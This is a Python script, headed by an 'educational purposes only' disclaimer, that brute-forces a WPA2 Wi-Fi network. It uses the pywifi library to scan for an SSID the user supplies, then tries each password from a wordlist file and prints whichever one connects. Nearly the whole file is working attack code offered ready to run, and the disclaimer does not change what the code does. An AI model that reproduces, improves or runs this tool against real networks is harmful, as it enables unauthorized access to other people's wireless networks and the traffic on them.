"""
DISCLAIMER
This code is intended for educational purposes only. 
It is designed to help users understand Wi-Fi security and password management. 
The creator of this code does not endorse or support any illegal activities, including unauthorized access to computer networks.
"""



import time
from pywifi import PyWiFi, const, Profile

def wifi_cracker(target_ssid, password_list):
    wifi = PyWiFi()  # Create Wi-Fi interface
    iface = wifi.interfaces()[0]  # Get the first interface (usually the one that is available)

    # Create a profile for the target SSID
    iface.scan()  # Start scanning
    time.sleep(2)  # Wait a bit for the scan to complete
    results = iface.scan_results()  # Get scan results

    # Check for the target SSID
    if not any(result.ssid == target_ssid for result in results):
        print(f"{target_ssid} SSID not found.")
        return

    print(f"Starting password attempts for {target_ssid}...")
    
    for password in password_list:
        # Create profile
        profile = Profile()
        profile.ssid = target_ssid
        profile.auth = const.AUTH_ALG_OPEN  # Open authentication
        profile.akm.append(const.AKM_TYPE_WPA2PSK)  # WPA2 PSK
        profile.cipher = const.CRYPT_TYPE_CCMP  # CCMP encryption
        profile.key = password  # Set the current password
        
        iface.remove_all_networks()  # Remove all profiles
        iface.add_network(profile)  # Add the new profile
        
        # Try to connect to the network
        iface.connect(iface.add_network(profile))
        time.sleep(3)  # Wait for connection
        
        if iface.status() == const.IFACE_CONNECTED:
            print(f"Successfully connected! Password: {password}")
            return
        else:
            print(f"{password} password failed.")

    print("All passwords attempted. Password not found.")

# Get target SSID and password list from user
target_ssid = input("Enter the target Wi-Fi SSID: ")
password_file = input("Enter the path to the password list file: ")

# Read the password list from the file
with open(password_file, 'r') as file:
    password_list = [line.strip() for line in file.readlines()]

# Start the password cracking process
wifi_cracker(target_ssid, password_list)
